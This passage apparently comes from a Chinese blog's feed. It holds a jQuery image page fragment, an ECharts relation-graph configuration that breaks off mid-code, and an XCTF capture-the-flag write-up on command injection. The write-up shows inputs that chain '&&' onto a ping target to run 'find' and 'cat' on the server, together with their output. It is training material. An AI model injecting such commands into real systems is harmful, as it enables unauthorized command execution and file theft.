class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span>                    <span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;img/11.png&quot;</span> <span class="hljs-attr">alt</span>=<span class="hljs-string">&quot;fruit11&quot;</span> <span class="hljs-attr">width</span>=<span class="hljs-string">&quot;200&quot;</span> <span class="hljs-attr">height</span>=<span class="hljs-string">&quot;200&quot;</span> /&gt;</span>                    <span class="hljs-tag">&lt;<span class="hljs-name">span</span>&gt;</span>Strawberry<span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span>                <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>                <span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span>                    <span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;img/12.png&quot;</span> <span class="hljs-attr">alt</span>=<span class="hljs-string">&quot;fruit12&quot;</span> <span class="hljs-attr">width</span>=<span class="hljs-string">&quot;200&quot;</span> <span class="hljs-attr">height</span>=<span class="hljs-string">&quot;200&quot;</span> /&gt;</span>                    <span class="hljs-tag">&lt;<span class="hljs-name">span</span>&gt;</span>Melon<span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span>                <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>            <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>        <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>    <span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span></code></pre>]]></content>
    
    
    <categories>
      
      <category>jquery</category>
      
      <category>前端</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>xctf 小宁写了个ping功能,但没有写WAF,X老师告诉她这是非常危险的</title>
    <link href="/2020/03/08/xctf-%E5%B0%8F%E5%AE%81%E5%86%99%E4%BA%86%E4%B8%AAping%E5%8A%9F%E8%83%BD%E4%BD%86%E6%B2%A1%E6%9C%89%E5%86%99wafx%E8%80%81%E5%B8%88%E5%91%8A%E8%AF%89%E5%A5%B9%E8%BF%99%E6%98%AF%E9%9D%9E%E5%B8%B8/index/"/>
    <url>/2020/03/08/xctf-%E5%B0%8F%E5%AE%81%E5%86%99%E4%BA%86%E4%B8%AAping%E5%8A%9F%E8%83%BD%E4%BD%86%E6%B2%A1%E6%9C%89%E5%86%99wafx%E8%80%81%E5%B8%88%E5%91%8A%E8%AF%89%E5%A5%B9%E8%BF%99%E6%98%AF%E9%9D%9E%E5%B8%B8/index/</url>
    
    <content type="html"><![CDATA[<p>【题目描述】</p><p>小宁写了个ping功能,但没有写WAF,X老师告诉她这是非常危险的，你知道为什么吗。</p><p>【目标】</p><p>掌握有关命令执行的知识</p><p>windows或linux下:</p><p>command1 &amp;&amp; command2 先执行command1，如果为真，再执行command2</p><p>command1 | command2 只执行command2</p><p>command1 &amp; command2 先执行command2后执行command1</p><p>command1 || command2 先执行command1，如果为假，再执行command2</p><p>命令执行漏洞（| || &amp; &amp;&amp; 称为 管道符） 构造语句</p><pre><code class="hljs bash">127.0.0.1 &amp;&amp; find /home -name flag*</code></pre><p>输出</p><pre><code class="hljs bash">ping -c 3 127.0.0.1 &amp;&amp; find /home -name flag*PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.068 ms64 bytes from 127.0.0.1: icmp_seq=2 ttl=64 time=0.058 ms64 bytes from 127.0.0.1: icmp_seq=3 ttl=64 time=0.050 ms--- 127.0.0.1 ping statistics ---3 packets transmitted, 3 received, 0% packet loss, time 1998msrtt min/avg/max/mdev = 0.050/0.058/0.068/0.011 ms/home/flag.txt</code></pre><p>得到flag位置，继续构造</p><pre><code class="hljs bash">127.0.0.1 &amp;&amp; cat /home/flag.txt</code></pre><p>得到结果：</p><pre><code class="hljs bash">ping -c 3 127.0.0.1 &amp;&amp; cat /home/flag.txtPING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.053 ms64 bytes from 127.0.0.1: icmp_seq=2 ttl=64 time=0.044 ms64 bytes from 127.0.0.1: icmp_seq=3 ttl=64 time=0.049 ms--- 127.0.0.1 ping statistics ---3 packets transmitted, 3 received, 0% packet loss, time 1998msrtt min/avg/max/mdev = 0.044/0.048/0.053/0.008 mscyberpeace&#123;8b8e359f89d584845ad41ae2fcc02d1e&#125;</code></pre><p>cyberpeace{8b8e359f89d584845ad41ae2fcc02d1e}就是flag</p>]]></content>
    
    
    <categories>
      
      <category>网络安全</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>echart——关系图graph详解（转载自https://www.cnblogs.com/wheatCatcher/p/11201721.html）</title>
    <link href="/2019/12/27/echart-%E5%85%B3%E7%B3%BB%E5%9B%BEgraph%E8%AF%A6%E8%A7%A3%EF%BC%88%E8%BD%AC%E8%BD%BD%E8%87%AAhttps-www-cnblogs-com-wheatcatcher-p-11201721-html%EF%BC%89/index/"/>
    <url>/2019/12/27/echart-%E5%85%B3%E7%B3%BB%E5%9B%BEgraph%E8%AF%A6%E8%A7%A3%EF%BC%88%E8%BD%AC%E8%BD%BD%E8%87%AAhttps-www-cnblogs-com-wheatcatcher-p-11201721-html%EF%BC%89/index/</url>
    
    <content type="html"><![CDATA[<pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">template</span>&gt;</span>  <span class="hljs-tag">&lt;<span class="hljs-name">VueEcharts</span> <span class="hljs-attr">:options</span>=<span class="hljs-string">&quot;options&quot;</span> <span class="hljs-attr">auto-resize</span> /&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">template</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="javascript"><span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> &#123;</span>  data () &#123;<span class="javascript">    <span class="hljs-keyword">const</span> title = &#123;</span><span class="javascript">      <span class="hljs-comment">// show: true,                                 //是否显示</span></span><span class="javascript">      text: <span class="hljs-string">&quot;画布关系图&quot;</span>,                             <span class="hljs-comment">//大标题</span></span><span class="javascript">      subtext: <span class="hljs-string">&quot;图形可拖动、缩放&quot;</span>,                          <span class="hljs-comment">//小标题</span></span><span class="javascript">      <span class="hljs-comment">// sublink: &quot;http://www.baidu.com&quot;,          //小标题链接</span></span><span class="javascript">      <span class="hljs-comment">// target: &quot;blank&quot;,                            //&#x27;self&#x27; 当前窗口打开，&#x27;blank&#x27; 新窗口打开</span></span><span class="javascript">      <span class="hljs-comment">// subtarget: &quot;blank&quot;,                        //小标题打开链接的窗口</span></span><span class="javascript">      <span class="hljs-comment">// textAlign: &quot;center&quot;,                       //文本水平对齐</span></span><span class="javascript">      <span class="hljs-comment">// textBaseline: &quot;top&quot;,                       //文本垂直对齐</span></span><span class="javascript">      <span class="hljs-comment">// textStyle: mytextStyle,                     //标题样式</span></span><span class="javascript">      <span class="hljs-comment">// subtextStyle: mytextStyle,                 //小标题样式</span></span><span class="javascript">      <span class="hljs-comment">// padding: 5,                                  //标题内边距 5  [5, 10]  [5,10,5,10]</span></span><span class="javascript">      <span class="hljs-comment">// itemGap: 10,                                 //大小标题间距</span></span><span class="javascript">      <span class="hljs-comment">// zlevel: 0,                                   //所属图形的Canvas分层，zlevel 大的 Canvas 会放在 zlevel 小的 Canvas 的上面</span></span><span class="javascript">      <span class="hljs-comment">// z: 2,                                         //所属组件的z分层，z值小的图形会被z值大的图形覆盖</span></span><span class="javascript">      <span class="hljs-comment">// left: &quot;center&quot;,                              //组件离容器左侧的距离,&#x27;left&#x27;, &#x27;center&#x27;, &#x27;right&#x27;,&#x27;20%&#x27;</span></span><span class="javascript">      <span class="hljs-comment">// top: &quot;top&quot;,                                   //组件离容器上侧的距离,&#x27;top&#x27;, &#x27;middle&#x27;, &#x27;bottom&#x27;,&#x27;20%&#x27;</span></span><span class="javascript">      <span class="hljs-comment">// right: &quot;auto&quot;,                               //组件离容器右侧的距离,&#x27;20%&#x27;</span></span><span class="javascript">      <span class="hljs-comment">// bottom: &quot;auto&quot;,                              //组件离容器下侧的距离,&#x27;20%&#x27;</span></span><span class="javascript">      <span class="hljs-comment">// backgroundColor: &quot;transparent&quot;,            //标题背景色</span></span><span class="javascript">      <span class="hljs-comment">// borderColor: &quot;#ccc&quot;,                         //边框颜色</span></span><span class="javascript">      <span class="hljs-comment">// borderWidth: 0,                               //边框线宽</span></span><span class="javascript">      <span class="hljs-comment">// shadowColor: &quot;red&quot;,                          //阴影颜色</span></span><span class="javascript">      <span class="hljs-comment">// shadowOffsetX: 0,                            //阴影水平方向上的偏移距离</span></span><span class="javascript">      <span class="hljs-comment">// shadowOffsetY: 0,                            //阴影垂直方向上的偏移距离</span></span><span class="javascript">      <span class="hljs-comment">// shadowBlur: 10,                               //阴影的模糊大小</span></span>    &#125;;<span class="javascript">    <span class="hljs-keyword">const</span> tooltip = &#123;                             <span class="hljs-comment">//提示框组件</span></span><span class="javascript">      trigger: <span class="hljs-string">&#x27;item&#x27;</span>,                            <span class="hljs-comment">//触发类型,&#x27;item&#x27;数据项图形触发，主要在散点图，饼图等无类目轴的图表中使用。 &#x27;axis&#x27;坐标轴触发，主要在柱状图，折线图等会使用类目轴的图表中使用。</span></span><span class="javascript">      <span class="hljs-comment">// triggerOn: &quot;mousemove&quot;,                      //提示框触发的条件,&#x27;mousemove&#x27;鼠标移动时触发。&#x27;click&#x27;鼠标点击时触发。&#x27;mousemove|click&#x27;同时鼠标移动和点击时触发。&#x27;none&#x27;不在 &#x27;mousemove&#x27; 或 &#x27;click&#x27; 时触发</span></span><span class="javascript">      <span class="hljs-comment">// showContent: true,                           //是否显示提示框浮层</span></span><span class="javascript">      <span class="hljs-comment">// alwaysShowContent: true,                     //是否永远显示提示框内容</span></span><span class="javascript">      <span class="hljs-comment">// showDelay: 0,                                  //浮层显示的延迟，单位为 ms</span></span><span class="javascript">      <span class="hljs-comment">// hideDelay: 100,                                //浮层隐藏的延迟，单位为 ms</span></span><span class="javascript">      <span class="hljs-comment">// enterable: false,                             //鼠标是否可进入提示框浮层中</span></span><span class="javascript">      <span class="hljs-comment">// confine: false,                               //是否将 tooltip 框限制在图表的区域内</span></span><span class="javascript">      <span class="hljs-comment">// transitionDuration: 0.4,                      //提示框浮层的移动动画过渡时间，单位是 s,设置为 0 的时候会紧跟着鼠标移动</span></span><span class="javascript">      <span class="hljs-comment">// position: [&#x27;50%&#x27;, &#x27;50%&#x27;],                    //提示框浮层的位置，默认不设置时位置会跟随鼠标的位置,[10, 10],回掉函数，inside鼠标所在图形的内部中心位置，top、left、bottom、right鼠标所在图形上侧，左侧，下侧，右侧，</span></span><span class="javascript">      formatter: <span class="hljs-string">&quot;&#123;b&#125;&quot;</span>,                          <span class="hljs-comment">//提示框浮层内容格式器，支持字符串模板和回调函数两种形式,模板变量有 &#123;a&#125;, &#123;b&#125;，&#123;c&#125;，&#123;d&#125;，&#123;e&#125;，分别表示系列名，数据名，数据值等&lt;br /&gt;&#123;b1&#125;: &#123;c1&#125;</span></span><span class="javascript">      <span class="hljs-comment">// backgroundColor: &quot;transparent&quot;,            //标题背景色</span></span><span class="javascript">      <span class="hljs-comment">// borderColor: &quot;#ccc&quot;,                        //边框颜色</span></span><span class="javascript">      <span class="hljs-comment">// borderWidth: 0,                              //边框线宽</span></span><span class="javascript">      <span class="hljs-comment">// padding: 5,                                  //图例内边距，单位px  5  [5, 10]  [5,10,5,10]</span></span><span class="javascript">      <span class="hljs-comment">// textStyle: mytextStyle,                     //文本样式</span></span>    &#125;;<span class="javascript">    <span class="hljs-keyword">const</span> toolbox = &#123;</span><span class="javascript">      <span class="hljs-comment">// show: true,                                 //是否显示工具栏组件</span></span><span class="javascript">      orient: <span class="hljs-string">&quot;horizontal&quot;</span>,                        <span class="hljs-comment">//工具栏 icon 的布局朝向&#x27;horizontal&#x27; &#x27;vertical&#x27;</span></span><span class="javascript">      <span class="hljs-comment">// itemSize: 15,                                 //工具栏 icon 的大小</span></span><span class="javascript">      <span class="hljs-comment">// itemGap: 10,                                  //工具栏 icon 每项之间的间隔</span></span><span class="javascript">      <span class="hljs-comment">// showTitle: true,                             //是否在鼠标 hover 的时候显示每个工具 icon 的标题</span></span>      feature: &#123;<span class="javascript">        mark: &#123;                                 <span class="hljs-comment">// &#x27;辅助线开关&#x27;</span></span><span class="javascript">          show: <span class="hljs-literal">true</span></span>        &#125;,<span class="javascript">        dataView: &#123;                            <span class="hljs-comment">//数据视图工具，可以展现当前图表所用的数据，编辑后可以动态更新</span></span><span class="javascript">          show: <span class="hljs-literal">true</span>,                         <span class="hljs-comment">//是否显示该工具。</span></span><span class="javascript">          title: <span class="hljs-string">&quot;数据视图&quot;</span>,</span><span class="javascript">          readOnly: <span class="hljs-literal">false</span>,                    <span class="hljs-comment">//是否不可编辑（只读）</span></span><span class="javascript">          lang: [<span class="hljs-string">&#x27;数据视图&#x27;</span>, <span class="hljs-string">&#x27;关闭&#x27;</span>, <span class="hljs-string">&#x27;刷新&#x27;</span>],  <span class="hljs-comment">//数据视图上有三个话术，默认是[&#x27;数据视图&#x27;, &#x27;关闭&#x27;, &#x27;刷新&#x27;]</span></span><span class="javascript">          backgroundColor: <span class="hljs-string">&quot;#fff&quot;</span>,             <span class="hljs-comment">//数据视图浮层背景色。</span></span><span class="javascript">          textareaColor: <span class="hljs-string">&quot;#fff&quot;</span>,               <span class="hljs-comment">//数据视图浮层文本输入区背景色</span></span><span class="javascript">          textareaBorderColor: <span class="hljs-string">&quot;#333&quot;</span>,         <span class="hljs-comment">//数据视图浮层文本输入区边框颜色</span></span><span class="javascript">          textColor: <span class="hljs-string">&quot;#000&quot;</span>,                    <span class="hljs-comment">//文本颜色。</span></span><span class="javascript">          buttonColor: <span class="hljs-string">&quot;#c23531&quot;</span>,              <span class="hljs-comment">//按钮颜色。</span></span><span class="javascript">          buttonTextColor: <span class="hljs-string">&quot;#fff&quot;</span>,             <span class="hljs-comment">//按钮文本颜色。</span></span>        &#125;,<span class="javascript">        magicType: &#123;                            <span class="hljs-comment">//动态类型切换</span></span><span class="javascript">          show: <span class="hljs-literal">true</span>,</span><span class="javascript">          title: <span class="hljs-string">&quot;切换&quot;</span>,                       <span class="hljs-comment">//各个类型的标题文本，可以分别配置。</span></span><span class="javascript">          type: [<span class="hljs-string">&#x27;line&#x27;</span>, <span class="hljs-string">&#x27;bar&#x27;</span>],              <span class="hljs-comment">//启用的动态类型，包括&#x27;line&#x27;（切换为折线图）, &#x27;bar&#x27;（切换为柱状图）, &#x27;stack&#x27;（切换为堆叠模式）, &#x27;tiled&#x27;（切换为平铺模式）</span></span>        &#125;,<span class="javascript">        restore: &#123;                             <span class="hljs-comment">//配置项还原。</span></span><span class="javascript">          show: <span class="hljs-literal">true</span>,                         <span class="hljs-comment">//是否显示该工具。</span></span><span class="javascript">          title: <span class="hljs-string">&quot;还原&quot;</span>,</span>        &#125;,<span class="javascript">        saveAsImage: &#123;                         <span class="hljs-comment">//保存为图片。</span></span><span class="javascript">          show: <span class="hljs-literal">true</span>,                         <span class="hljs-comment">//是否显示该工具。</span></span><span class="javascript">          type: <span class="hljs-string">&quot;png&quot;</span>,                         <span class="hljs-comment">//保存的图片格式。支持 &#x27;png&#x27; 和 &#x27;jpeg&#x27;。</span></span><span class="javascript">          name: <span class="hljs-string">&quot;pic1&quot;</span>,                        <span class="hljs-comment">//保存的文件名称，默认使用 title.text 作为名称</span></span><span class="javascript">          backgroundColor: <span class="hljs-string">&quot;#ffffff&quot;</span>,        <span class="hljs-comment">//保存的图片背景色，默认使用 backgroundColor，如果backgroundColor不存在的话会取白色</span></span><span class="javascript">          title: <span class="hljs-string">&quot;保存为图片&quot;</span>,</span><span class="javascript">          pixelRatio: <span class="hljs-number">1</span>                        <span class="hljs-comment">//保存图片的分辨率比例，默认跟容器相同大小，如果需要保存更高分辨率的，可以设置为大于 1 的值，例如 2</span></span>        &#125;,<span class="javascript">        dataZoom: &#123;                             <span class="hljs-comment">//数据区域缩放。目前只支持直角坐标系的缩放</span></span><span class="javascript">          show: <span class="hljs-literal">true</span>,                         <span class="hljs-comment">//是否显示该工具。</span></span><span class="javascript">          title: <span class="hljs-string">&quot;缩放&quot;</span>,                       <span class="hljs-comment">//缩放和还原的标题文本</span></span><span class="javascript">          xAxisIndex: <span class="hljs-number">0</span>,                       <span class="hljs-comment">//指定哪些 xAxis 被控制。如果缺省则控制所有的x轴。如果设置为 false 则不控制任何x轴。如果设置成 3 则控制 axisIndex 为 3 的x轴。如果设置为 [0, 3] 则控制 axisIndex 为 0 和 3 的x轴</span></span><span class="javascript">          yAxisIndex: <span class="hljs-literal">false</span>,                   <span class="hljs-comment">//指定哪些 yAxis 被控制。如果缺省则控制所有的y轴。如果设置为 false 则不控制任何y轴。如果设置成 3 则控制 axisIndex 为 3 的y轴。如果设置为 [0, 3] 则控制 axisIndex 为 0 和 3 的y轴</span></span>        &#125;,      &#125;,<span class="javascript">      <span class="hljs-comment">// zlevel: 0,                                   //所属图形的Canvas分层，zlevel 大的 Canvas 会放在 zlevel 小的 Canvas 的上面</span></span><span class="javascript">      <span class="hljs-comment">// z: 2,                                         //所属组件的z分层，z值小的图形会被z值大的图形覆盖</span></span><span class="javascript">      <span class="hljs-comment">// left: &quot;center&quot;,                              //组件离容器左侧的距离,&#x27;left&#x27;, &#x27;center&#x27;, &#x27;right&#x27;,&#x27;20%&#x27;</span></span><span class="javascript">      <span class="hljs-comment">// top: &quot;top&quot;,                                   //组件离容器上侧的距离,&#x27;top&#x27;, &#x27;middle&#x27;, &#x27;bottom&#x27;,&#x27;20%&#x27;</span></span><span class="javascript">      right: <span class="hljs-string">&quot;2%&quot;</span>,                               <span class="hljs-comment">//组件离容器右侧的距离,&#x27;20%&#x27;</span></span><span class="javascript">      <span class="hljs-comment">// bottom: &quot;auto&quot;,                              //组件离容器下侧的距离,&#x27;20%&#x27;</span></span><span class="javascript">      <span class="hljs-comment">// width: &quot;auto&quot;,                               //图例宽度</span></span><span class="javascript">      <span class="hljs-comment">// height: &quot;auto&quot;,                              //图例高度</span></span>    &#125;;<span class="javascript">    <span class="hljs-keyword">const</span> legend = &#123;</span><span class="javascript">      <span class="hljs-comment">// show: true,                                  //是否显示</span></span><span class="javascript">      <span class="hljs-comment">// zlevel: 0,                                   //所属图形的Canvas分层，zlevel 大的 Canvas 会放在 zlevel 小的 Canvas 的上面</span></span><span class="javascript">      <span class="hljs-comment">// z: 2,                                         //所属组件的z分层，z值小的图形会被z值大的图形覆盖</span></span><span class="javascript">      <span class="hljs-comment">// left: &quot;center&quot;,                              //组件离容器左侧的距离,&#x27;left&#x27;, &#x27;center&#x27;, &#x27;right&#x27;,&#x27;20%&#x27;</span></span><span class="javascript">      <span class="hljs-comment">// top: &quot;top&quot;,                                   //组件离容器上侧的距离,&#x27;top&#x27;, &#x27;middle&#x27;, &#x27;bottom&#x27;,&#x27;20%&#x27;</span></span><span class="javascript">      <span class="hljs-comment">// right: &quot;auto&quot;,                               //组件离容器右侧的距离,&#x27;20%&#x27;</span></span><span class="javascript">      <span class="hljs-comment">// bottom: &quot;auto&quot;,                              //组件离容器下侧的距离,&#x27;20%&#x27;</span></span><span class="javascript">      <span class="hljs-comment">// width: &quot;auto&quot;,                               //图例宽度</span></span><span class="javascript">      <span class="hljs-comment">// height: &quot;auto&quot;,                              //图例高度</span></span><span class="javascript">      <span class="hljs-comment">// orient: &quot;horizontal&quot;,                        //图例排列方向</span></span><span class="javascript">      <span class="hljs-comment">// align: &quot;auto&quot;,                               //图例标记和文本的对齐,left,right</span></span><span class="javascript">      <span class="hljs-comment">// padding: 5,                                   //图例内边距，单位px  5  [5, 10]  [5,10,5,10]</span></span><span class="javascript">      <span class="hljs-comment">// itemGap: 10,                                  //图例每项之间的间隔</span></span><span class="javascript">      <span class="hljs-comment">// itemWidth: 25,                               //图例标记的图形宽度</span></span><span class="javascript">      <span class="hljs-comment">// itemHeight: 14,                              //图例标记的图形高度</span></span><span class="javascript">      <span class="hljs-comment">// formatter: function (name) &#123;                 //用来格式化图例文本，支持字符串模板和回调函数两种形式。模板变量为图例名称 &#123;name&#125;</span></span><span class="javascript">      <span class="hljs-comment">//   return &#x27;Legend &#x27; + name;</span></span><span class="javascript">      <span class="hljs-comment">// &#125;,</span></span><span class="javascript">      <span class="hljs-comment">// selectedMode: &quot;single&quot;,                    //图例选择的模式,true开启,false关闭,single单选,multiple多选</span></span><span class="javascript">      <span class="hljs-comment">// inactiveColor: &quot;#ccc&quot;,                     //图例关闭时的颜色</span></span><span class="javascript">      <span class="hljs-comment">// textStyle: mytextStyle,                    //文本样式</span></span><span class="javascript">      data: [<span class="hljs-string">&#x27;当前特征&#x27;</span>, <span class="hljs-string">&#x27;个人特征&#x27;</span>, <span class="hljs-string">&#x27;公共特征&#x27;</span>, <span class="hljs-string">&#x27;特征画布&#x27;</span>],          <span class="hljs-comment">//series中根据名称区分</span></span><span class="javascript">      <span class="hljs-comment">// backgroundColor: &quot;transparent&quot;,            //标题背景色</span></span><span class="javascript">      <span class="hljs-comment">// borderColor: &quot;#ccc&quot;,                         //边框颜色</span></span><span class="javascript">      <span class="hljs-comment">// borderWidth: 0,                               //边框线宽</span></span><span class="javascript">      <span class="hljs-comment">// shadowColor: &quot;red&quot;,                          //阴影颜色</span></span><span class="javascript">      <span class="hljs-comment">// shadowOffsetX: 0,                            //阴影水平方向上的偏移距离</span></span><span class="javascript">      <span class="hljs-comment">// shadowOffsetY: 0,                            //阴影垂直方向上的偏移距离</span></span><span class="javascript">      <span class="hljs-comment">// shadowBlur: 10,                               //阴影的模糊大小</span></span>    &#125;;<span class="javascript">    <span class="hljs-keyword">const</span> dataZoom = [                                      <span class="hljs-comment">//区域缩放</span></span>      &#123;<span class="javascript">        id: <span class="hljs-string">&#x27;dataZoomX&#x27;</span>,</span><span class="javascript">        show: <span class="hljs-literal">true</span>,                              <span class="hljs-comment">//是否显示 组件。如果设置为 false，不会显示，但是数据过滤的功能还存在。</span></span><span class="javascript">        backgroundColor: <span class="hljs-string">&quot;rgba(47,69,84,0)&quot;</span>,  <span class="hljs-comment">//组件的背景颜色</span></span><span class="javascript">        type: <span class="hljs-string">&#x27;slider&#x27;</span>,                         <span class="hljs-comment">//slider表示有滑动块的，inside表示内置的</span></span><span class="javascript">        dataBackground: &#123;                        <span class="hljs-comment">//数据阴影的样式。</span></span><span class="javascript">          lineStyle: mylineStyle,              <span class="hljs-comment">//阴影的线条样式</span></span><span class="javascript">          areaStyle: myareaStyle,              <span class="hljs-comment">//阴影的填充样式</span></span>        &#125;,<span class="javascript">        fillerColor: <span class="hljs-string">&quot;rgba(167,183,204,0.4)&quot;</span>,  <span class="hljs-comment">//选中范围的填充颜色。</span></span><span class="javascript">        borderColor: <span class="hljs-string">&quot;#ddd&quot;</span>,                     <span class="hljs-comment">//边框颜色。</span></span><span class="javascript">        filterMode: <span class="hljs-string">&#x27;filter&#x27;</span>,                   <span class="hljs-comment">//&#x27;filter&#x27;：当前数据窗口外的数据，被 过滤掉。即 会 影响其他轴的数据范围。每个数据项，只要有一个维度在数据窗口外，整个数据项就会被过滤掉。</span></span><span class="javascript">        <span class="hljs-comment">//&#x27;weakFilter&#x27;：当前数据窗口外的数据，被 过滤掉。即 会 影响其他轴的数据范围。每个数据项，只有当全部维度都在数据窗口同侧外部，整个数据项才会被过滤掉。</span></span><span class="javascript">        <span class="hljs-comment">//&#x27;empty&#x27;：当前数据窗口外的数据，被 设置为空。即 不会 影响其他轴的数据范围。</span></span><span class="javascript">        <span class="hljs-comment">//&#x27;none&#x27;: 不过滤数据，只改变数轴范围。</span></span><span class="javascript">        xAxisIndex: <span class="hljs-number">0</span>,                            <span class="hljs-comment">//设置 dataZoom-inside 组件控制的 x轴,可以用数组表示多个轴</span></span><span class="javascript">        yAxisIndex: [<span class="hljs-number">0</span>, <span class="hljs-number">2</span>],                        <span class="hljs-comment">//设置 dataZoom-inside 组件控制的 y轴,可以用数组表示多个轴</span></span><span class="javascript">        radiusAxisIndex: <span class="hljs-number">3</span>,                       <span class="hljs-comment">//设置 dataZoom-inside 组件控制的 radius 轴,可以用数组表示多个轴</span></span><span class="javascript">        angleAxisIndex: [<span class="hljs-number">0</span>, <span class="hljs-number">2</span>],                    <span class="hljs-comment">//设置 dataZoom-inside 组件控制的 angle 轴,可以用数组表示多个轴</span></span><span class="javascript">        start: <span class="hljs-number">30</span>,                                <span class="hljs-comment">//数据窗口范围的起始百分比,表示30%</span></span><span class="javascript">        end: <span class="hljs-number">70</span>,                                  <span class="hljs-comment">//数据窗口范围的结束百分比,表示70%</span></span><span class="javascript">        startValue: <span class="hljs-number">10</span>,                           <span class="hljs-comment">//数据窗口范围的起始数值</span></span><span class="javascript">        endValue: <span class="hljs-number">100</span>,                            <span class="hljs-comment">//数据窗口范围的结束数值。</span></span><span class="javascript">        orient: <span class="hljs-string">&quot;horizontal&quot;</span>,                    <span class="hljs-comment">//布局方式是横还是竖。不仅是布局方式，对于直角坐标系而言，也决定了，缺省情况控制横向数轴还是纵向数轴。&#x27;horizontal&#x27;：水平。&#x27;vertical&#x27;：竖直。</span></span><span class="javascript">        zoomLock: <span class="hljs-literal">false</span>,                          <span class="hljs-comment">//是否锁定选择区域（或叫做数据窗口）的大小。如果设置为 true 则锁定选择区域的大小，也就是说，只能平移，不能缩放。</span></span><span class="javascript">        throttle: <span class="hljs-number">100</span>,                             <span class="hljs-comment">//设置触发视图刷新的频率。单位为毫秒（ms）。</span></span><span class="javascript">        zoomOnMouseWheel: <span class="hljs-literal">true</span>,                  <span class="hljs-comment">//如何触发缩放。可选值为：true：表示不按任何功能键，鼠标滚轮能触发缩放。false：表示鼠标滚轮不能触发缩放。&#x27;shift&#x27;：表示按住 shift 和鼠标滚轮能触发缩放。&#x27;ctrl&#x27;：表示按住 ctrl 和鼠标滚轮能触发缩放。&#x27;alt&#x27;：表示按住 alt 和鼠标滚轮能触发缩放。</span></span><span class="javascript">        moveOnMouseMove: <span class="hljs-literal">true</span>,                   <span class="hljs-comment">//如何触发数据窗口平移。true：表示不按任何功能键，鼠标移动能触发数据窗口平移。false：表示鼠标滚轮不能触发缩放。&#x27;shift&#x27;：表示按住 shift 和鼠标移动能触发数据窗口平移。&#x27;ctrl&#x27;：表示按住 ctrl 和鼠标移动能触发数据窗口平移。&#x27;alt&#x27;：表示按住 alt 和鼠标移动能触发数据窗口平移。</span></span><span class="javascript">        left: <span class="hljs-string">&quot;center&quot;</span>,                           <span class="hljs-comment">//组件离容器左侧的距离,&#x27;left&#x27;, &#x27;center&#x27;, &#x27;right&#x27;,&#x27;20%&#x27;</span></span><span class="javascript">        top: <span class="hljs-string">&quot;top&quot;</span>,                                <span class="hljs-comment">//组件离容器上侧的距离,&#x27;top&#x27;, &#x27;middle&#x27;, &#x27;bottom&#x27;,&#x27;20%&#x27;</span></span><span class="javascript">        right: <span class="hljs-string">&quot;auto&quot;</span>,                             <span class="hljs-comment">//组件离容器右侧的距离,&#x27;20%&#x27;</span></span><span class="javascript">        bottom: <span class="hljs-string">&quot;auto&quot;</span>,                            <span class="hljs-comment">//组件离容器下侧的距离,&#x27;20%&#x27;</span></span>      &#125;,      &#123;<span class="javascript">        id: <span class="hljs-string">&#x27;dataZoomY&#x27;</span>,</span><span class="javascript">        type: <span class="hljs-string">&#x27;inside&#x27;</span>,</span><span class="javascript">        filterMode: <span class="hljs-string">&#x27;empty&#x27;</span>,</span><span class="javascript">        disabled: <span class="hljs-literal">false</span>,                         <span class="hljs-comment">//是否停止组件的功能。</span></span><span class="javascript">        xAxisIndex: <span class="hljs-number">0</span>,                           <span class="hljs-comment">//设置 dataZoom-inside 组件控制的 x轴,可以用数组表示多个轴</span></span><span class="javascript">        yAxisIndex: [<span class="hljs-number">0</span>, <span class="hljs-number">2</span>],                       <span class="hljs-comment">//设置 dataZoom-inside 组件控制的 y轴,可以用数组表示多个轴</span></span><span class="javascript">        radiusAxisIndex: <span class="hljs-number">3</span>,                      <span class="hljs-comment">//设置 dataZoom-inside 组件控制的 radius 轴,可以用数组表示多个轴</span></span><span class="javascript">        angleAxisIndex: [<span class="hljs-number">0</span>, <span class="hljs-number">2</span>],                   <span class="hljs-comment">//设置 dataZoom-inside 组件控制的 angle 轴,可以用数组表示多个轴</span></span><span class="javascript">        start: <span class="hljs-number">30</span>,                               <span class="hljs-comment">//数据窗口范围的起始百分比,表示30%</span></span><span class="javascript">        end: <span class="hljs-number">70</span>,                                  <span class="hljs-comment">//数据窗口范围的结束百分比,表示70%</span></span><span class="javascript">        startValue: <span class="hljs-number">10</span>,                           <span class="hljs-comment">//数据窗口范围的起始数值</span></span><span class="javascript">        endValue: <span class="hljs-number">100</span>,                            <span class="hljs-comment">//数据窗口范围的结束数值。</span></span><span class="javascript">        orient: <span class="hljs-string">&quot;horizontal&quot;</span>,                    <span class="hljs-comment">//布局方式是横还是竖。不仅是布局方式，对于直角坐标系而言，也决定了，缺省情况控制横向数轴还是纵向数轴。&#x27;horizontal&#x27;：水平。&#x27;vertical&#x27;：竖直。</span></span><span class="javascript">        zoomLock: <span class="hljs-literal">false</span>,                          <span class="hljs-comment">//是否锁定选择区域（或叫做数据窗口）的大小。如果设置为 true 则锁定选择区域的大小，也就是说，只能平移，不能缩放。</span></span><span class="javascript">        throttle: <span class="hljs-number">100</span>,                             <span class="hljs-comment">//设置触发视图刷新的频率。单位为毫秒（ms）。</span></span><span class="javascript">        zoomOnMouseWheel: <span 